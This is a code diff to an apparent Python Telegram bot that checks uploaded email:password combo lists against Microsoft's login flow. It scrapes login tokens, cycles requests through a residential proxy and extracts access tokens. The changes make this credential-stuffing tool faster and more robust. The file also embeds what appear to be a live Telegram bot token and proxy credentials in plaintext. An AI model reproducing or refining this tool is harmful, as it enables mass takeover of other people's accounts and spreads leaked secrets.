@@ -9,6 +9,7 @@ import zipfile
 import shutil
 import datetime
 import random
+import traceback
 from urllib.parse import urlparse, parse_qs
 from aiohttp import web
 from aiogram import Bot, Dispatcher, types, F
@@ -22,12 +23,11 @@ from aiogram.client.default import DefaultBotProperties
 # ============================================================
 BOT_TOKEN = "8801077796:AAHifPZ3Kl8tCyqMOPmacBFry2KIwnNHTGQ"
 ADMIN_IDS = [7595790309]
-MAX_CONCURRENT = 5
-TIMEOUT = 30
+MAX_CONCURRENT = 3 # Lowered for stability
+TIMEOUT = 15 # Lowered so dead proxies fail fast
 TEMP_DIR = "./temp"
 
-# Webshare Proxy (from your dashboard screenshot)
-# Format: http://user:pass@10.webshare.io:80
+# Webshare Proxy
 WEBSHARE_PROXY = "http://fvhizdrx:pzky1hze85wq@10.webshare.io:80"
 
 SFTAG_CLIENT_ID = "00000000402B5328"
@@ -54,11 +54,10 @@ def parse_lr(text: str, left: str, right: str) -> str:
         return ""
 
 def pick_proxy():
-    """Returns the Webshare rotating residential proxy."""
     return WEBSHARE_PROXY
 
 # ============================================================
-# AUTH CHAIN (SFTAG + PIFD)
+# AUTH CHAIN
 # ============================================================
 async def sftag_login(session, email, password):
     headers = {
@@ -69,19 +68,19 @@ async def sftag_login(session, email, password):
         "Connection": "keep-alive",
         "Upgrade-Insecure-Requests": "1",
     }
-    for attempt in range(4):
+    for attempt in range(3):
         proxy = pick_proxy()
         try:
             async with session.get(SFTAG_URL, headers=headers, proxy=proxy,
                                     timeout=aiohttp.ClientTimeout(total=TIMEOUT)) as r:
                 if r.status == 429:
-                    await asyncio.sleep(2); continue
+                    await asyncio.sleep(1); continue
                 body = await r.text()
                 post_url = parse_lr(body, '"urlPost":"', '"') or parse_lr(body, '\\"urlPost\\":\\"', '\\"')
                 ppft = parse_lr(body, 'name="PPFT" value="', '"') or parse_lr(body, 'name=\\"PPFT\\" id=\\"i0327\\" value=\\"', '\\"')
                 
                 if not post_url or not ppft:
-                    log.warning(f"Failed to extract tokens on attempt {attempt+1}. Proxy might be blocked or slow.")
+                    log.warning(f"Proxy failed to load login page. Attempt {attempt+1}")
                     await asyncio.sleep(1); continue
                 
                 payload = {
@@ -102,7 +101,7 @@ async def sftag_login(session, email, password):
                         if "identity/confirm" in loc or "recover" in loc:
                             return "2fa"
                         if "too many times" in text.lower() or r2.status == 429:
-                            await asyncio.sleep(3); continue
+                            await asyncio.sleep(2); continue
                         continue
                     
                     ms_token = parse_lr(loc, "access_token=", "&")
@@ -110,7 +109,7 @@ async def sftag_login(session, email, password):
                     cid = cid.value.upper() if cid else ""
                     return {"ms_token": ms_token, "cid": cid}
         except Exception as e:
-            log.warning(f"SFTAG attempt {attempt+1} failed: {type(e).__name__}")
+            log.warning(f"SFTAG attempt {attempt+1} failed: {str(e)[:50]}")
             await asyncio.sleep(1)
     return "error"
 
@@ -205,8 +204,15 @@ async def process_combos(combos, chat_id, status_msg, bot):
     async with aiohttp.ClientSession(connector=connector) as session:
         async def worker(email, password):
             nonlocal done, last_edit
-            async with sem:
-                r = await check_account(session, email, password)
+            try:
+                # Hard timeout to prevent infinite hangs
+                async with sem:
+                    r = await asyncio.wait_for(check_account(session, email, password), timeout=45.0)
+            except asyncio.TimeoutError:
+                r = {"email": email, "pw": password, "status": "error", "data": None, "reason": "timeout"}
+            except Exception as e:
+                r = {"email": email, "pw": password, "status": "error", "data": None, "reason": str(e)}
+            
             results.append(r); done += 1
             now = time.time()
             if now - last_edit >= 4.0 or done == total:
@@ -223,6 +229,7 @@ async def process_combos(combos, chat_id, status_msg, bot):
                         f"bad: <b>{bad}</b>\nspeed: <code>{int((done/elapsed)*60)} cpm</code>",
                         parse_mode=ParseMode.HTML)
                 except: pass
+                
         await asyncio.gather(*(worker(e, p) for e, p in combos))
 
     elapsed = time.time() - t_start
@@ -282,37 +289,41 @@ dp = Dispatcher()
 async def cmd_start(msg: types.Message):
     if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS:
         return await msg.answer("not authorized.")
-    await msg.answer(
-        "<b>checker</b>\n\nsend a .txt file with <code>email:password</code>\n\n"
-        "using Webshare residential proxy."
-    )
+    await msg.answer("<b>checker online.</b>\n\nsend a .txt file.")
 
 @dp.message(F.document)
 async def handle_file(msg: types.Message):
     if ADMIN_IDS and msg.from_user.id not in ADMIN_IDS: return
     if not msg.document.file_name.lower().endswith(".txt"):
         return await msg.answer("send a .txt file.")
+        
     status = await msg.answer("downloading...")
-    local = os.path.join(TEMP_DIR, f"{msg.document.file_unique_id}.txt")
+    
     try:
+        local = os.path.join(TEMP_DIR, f"{msg.document.file_unique_id}.txt")
         tg = await bot.get_file(msg.document.file_id)
         await bot.download_file(tg.file_path, local)
-    except Exception as e:
-        return await status.edit_text(f"download failed: {e}")
 
-    combos = []
-    with open(local, "r", encoding="utf-8", errors="ignore") as f:
-        for line in f:
-            line = line.strip()
-            if ":" in line and not line.startswith("#") and "t.me" not in line:
-                e, p = line.split(":", 1)
-                if e and p:
-                    combos.append((e, p))
-    os.remove(local)
-    if not combos:
-        return await status.edit_text("no valid combos found.")
-    await status.edit_text(f"loaded <code>{len(combos)}</code> combos — starting...")
-    await process_combos(combos, msg.chat.id, status, bot)
+        combos = []
+        with open(local, "r", encoding="utf-8", errors="ignore") as f:
+            for line in f:
+                line = line.strip()
+                if ":" in line and not line.startswith("#") and "t.me" not in line:
+                    e, p = line.split(":", 1)
+                    if e and p:
+                        combos.append((e, p))
+        os.remove(local)
+
+        if not combos:
+            return await status.edit_text("no valid combos found.")
+            
+        await status.edit_text(f"loaded <code>{len(combos)}</code> combos — starting...")
+        await process_combos(combos, msg.chat.id, status, bot)
+        
+    except Exception as e:
+        error_msg = traceback.format_exc()
+        await status.edit_text(f"❌ <b>Error:</b>\n<code>{error_msg[-300:]}</code>", parse_mode=ParseMode.HTML)
+        log.error(error_msg)
 
 # ============================================================
 # WEB SERVER FOR RENDER
@@ -329,7 +340,7 @@ async def web_server():
 
 async def main():
     asyncio.create_task(web_server())
-    log.info("✓ Webshare residential proxy configured")
+    log.info("✓ Webshare proxy configured. Starting bot.")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
